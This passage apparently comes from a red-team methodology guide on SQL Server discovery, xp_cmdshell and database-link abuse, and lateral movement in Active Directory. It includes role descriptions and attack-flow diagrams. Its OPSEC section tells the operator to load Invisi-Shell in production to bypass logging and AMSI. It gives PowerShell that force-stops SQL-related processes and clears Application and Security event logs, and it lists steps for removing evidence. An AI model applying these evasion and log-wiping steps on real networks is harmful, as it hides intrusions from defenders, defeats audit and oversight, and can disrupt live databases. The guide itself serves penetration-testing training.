- **Focus**: SQL Server discovery, SPN enumeration, instance mapping
- **Tools**: Get-DomainComputer, sqlcmd, PowerUpSQL
- **Output**: SQL Server topology, instance inventory, service locations
- **Timeline**: 2-4 hours for comprehensive mapping

### **⚔️ SQL Security Assessor**
- **Focus**: Security configuration analysis, vulnerability identification
- **Tools**: PowerUpSQL, sqlcmd queries, PowerView filters
- **Output**: Security assessment, risk matrix, attack vectors
- **Timeline**: 1-2 hours for security analysis

### **🚀 Database Exploitation Engineer**
- **Focus**: xp_cmdshell abuse, database links, lateral movement
- **Tools**: PowerUpSQL, sqlcmd, custom SQL queries
- **Output**: Command execution, lateral movement paths, elevated access
- **Timeline**: 30 minutes to 2 hours depending on complexity

### **🛡️ OPSEC Coordinator**
- **Focus**: Stealth operations, detection avoidance, cleanup
- **Tools**: Invisi-Shell, timing controls, log analysis
- **Output**: Stealth protocols, detection metrics, cleanup procedures
- **Timeline**: Continuous throughout operation

---

## 🎨 **VISUAL MASTERY: SQL SERVER ATTACK FLOWS**

### **SQL Server Lateral Movement Workflow**


```mermaid
flowchart TD
    subgraph "🔍 Discovery Phase"
        A[🎯 Invisi-Shell Setup] --> B[🔍 SQL Server Discovery]
        B --> C[📋 Instance Enumeration]
        C --> D[🔗 Link Discovery]
    end
    
    subgraph "⚔️ Analysis Phase"
        D --> E[🔒 Security Assessment]
        E --> F[⚠️ Vulnerability Analysis]
        F --> G[🎯 Attack Vector Mapping]
    end
    
    subgraph "🚀 Exploitation Phase"
        G --> H[💥 xp_cmdshell Abuse]
        H --> I[🔗 Database Link Abuse]
        I --> J[🌐 Lateral Movement]
    end
    
    subgraph "🔄 Persistence Phase"
        J --> K[💾 Credential Storage]
        K --> L[🔄 Reusable Access]
        L --> M[🎯 Network Expansion]
    end
    
    %% Styling
    classDef discovery fill:#e3f2fd,stroke:#1565c0,stroke-width:3px
    classDef analysis fill:#f3e5f5,stroke:#7b1fa2,stroke-width:3px
    classDef exploitation fill:#ffebee,stroke:#d32f2f,stroke-width:3px
    classDef persistence fill:#e8f5e8,stroke:#388e3c,stroke-width:3px
    
    class A,B,C,D discovery
    class E,F,G analysis
    class H,I,J exploitation
    class K,L,M persistence
```

### **SQL Server Attack Vector Mapping**

```mermaid
mindmap
  root((SQL Server Attacks))
    🔴 Critical
      xp_cmdshell
        Command execution
        OS foothold
      Database Links
        Lateral movement
        Trust abuse
    🟠 High
      Service Accounts
        Credential theft
        Privilege escalation
      Weak Authentication
        SQL auth abuse
        Password attacks
    🟡 Medium
      SPN Enumeration
        Service discovery
        Network mapping
      Configuration
        Security settings
        Audit bypass
    🟢 Low
      Information Disclosure
        Version info
        Database names
      Network Discovery
        Port scanning
        Service detection
```


---

## 🧪 **LAB vs PRODUCTION EXECUTION PROFILES**

### **🧪 LAB ENVIRONMENT**
- **Timing**: No restrictions, immediate execution
- **Scope**: Full enumeration, all instances, comprehensive analysis
- **Tools**: All tools available, no stealth requirements
- **Logging**: Minimal concern, focus on learning
- **Risk**: Low, controlled environment

### **🏢 PRODUCTION ENVIRONMENT**
- **Timing**: 3-6 second jitter between queries, gradual escalation
- **Scope**: Targeted enumeration, focus on vulnerable instances
- **Tools**: Invisi-Shell mandatory, stealth-first approach
- **Logging**: Maximum stealth, minimal footprint
- **Risk**: High, detection consequences

### **⚡ BALANCED APPROACH**
- **Timing**: 1-2 second jitter, moderate pace
- **Scope**: Strategic enumeration, vulnerability-focused
- **Tools**: Invisi-Shell + selective tooling
- **Logging**: Moderate stealth, controlled visibility
- **Risk**: Medium, balanced approach

---

## 🔒 **DETECTION/OPSEC & CLEANUP**

### **🔒 STEALTH REQUIREMENTS**
> **⚠️ CRITICAL**: **Invisi-Shell** must be loaded before any SQL Server enumeration in production environments to bypass logging and AMSI detection.

#### **OPSEC Best Practices**
- **Timing Control**: Use 3-6 second jitter between queries
- **Query Patterns**: Avoid predictable enumeration sequences
- **Tool Selection**: Use Microsoft-signed tools when possible
- **Scope Limitation**: Focus on specific SQL Server components
- **Response Analysis**: Monitor for detection indicators

#### **Detection Avoidance**
- **Event Logging**: Minimize SQL Server enumeration events
- **Network Monitoring**: Blend with normal database activity
- **Query Volume**: Limit concurrent queries
- **Tool Signatures**: Use native tools to avoid detection
- **Response Patterns**: Analyze responses for anomalies

### **🧹 Cleanup Procedures**

#### **SQL Server Cleanup**
```powershell
# Remove SQL Server enumeration artifacts
Remove-Variable sqlResults -ErrorAction SilentlyContinue
Remove-Variable sqlInstances -ErrorAction SilentlyContinue
Remove-Variable sqlLinks -ErrorAction SilentlyContinue

# Clear SQL Server connection cache
Get-Process | Where-Object {$_.ProcessName -like "*sql*"} | Stop-Process -Force -ErrorAction SilentlyContinue
```

#### **Log Cleanup**
```powershell
# Clear relevant event logs (requires elevation)
Clear-EventLog -LogName "Application" -Source "MSSQL*" -ErrorAction SilentlyContinue
Clear-EventLog -LogName "Security" -Source "Microsoft-Windows-Security-Auditing" -ErrorAction SilentlyContinue
```

#### **Evidence Removal**
- **Temporary Files**: Remove SQL query results and logs
- **Command History**: Clear PowerShell history
- **Registry Keys**: Remove any custom registry entries
- **Network Traces**: Clear network connection logs

---

## 🔗 **CROSS-REFERENCES & INTEGRATION**

### **📚 Related Enumeration Techniques**
- **[SPN Enumeration](./24_SPN_Enumeration_Techniques.md)**: Discover SQL Server service accounts
- **[Computer Enumeration](./07_Computer_Enumeration.md)**: SQL Server host discovery
- **[Service Enumeration](./21_Time_Based_Enumeration.md)**: SQL Server service analysis
- **[ACL Enumeration](./09_ACL_Enumeration.md)**: SQL Server permission analysis
- **[Kerberos Basic Enumeration](./23_Kerberos_Basic_Enumeration.md)**: SQL Server authentication

### **🛠️ Tool Integration**
- **[Tool Setup & Loading](./01_Tool_Setup_Loading.md)**: Invisi-Shell, PowerView, PowerUpSQL setup
- **[PowerShell Remoting](./19_PowerShell_Remoting_Enumeration.md)**: Remote SQL Server enumeration
- **[WMI Enumeration](./20_WMI_Enumeration.md)**: SQL Server service enumeration
- **[Registry Enumeration](./18_Registry_Enumeration.md)**: SQL Server configuration analysis

### **🎯 Attack Path Integration**
- **[User Enumeration](./05_User_Enumeration.md)**: SQL Server service account identification
- **[Session Enumeration](./13_Active_Session_Discovery.md)**: SQL Server connection analysis
- **[BloodHound Integration](./10_BloodHound_Enumeration.md)**: SQL Server attack path mapping
- **[Kerberos Advanced Attacks](./26_Kerberos_Advanced_Attacks.md)**: SQL Server authentication abuse

### **🛡️ Detection & Defense**
- **[Blue Team Detection](./32_Detection_Blue_Team.md)**: SQL Server monitoring and alerting
- **[Red Team OPSEC](./33_Detection_Red_Team.md)**: Stealth techniques and evasion
- ****Remediation Planning (removed)****: SQL Server security hardening

---
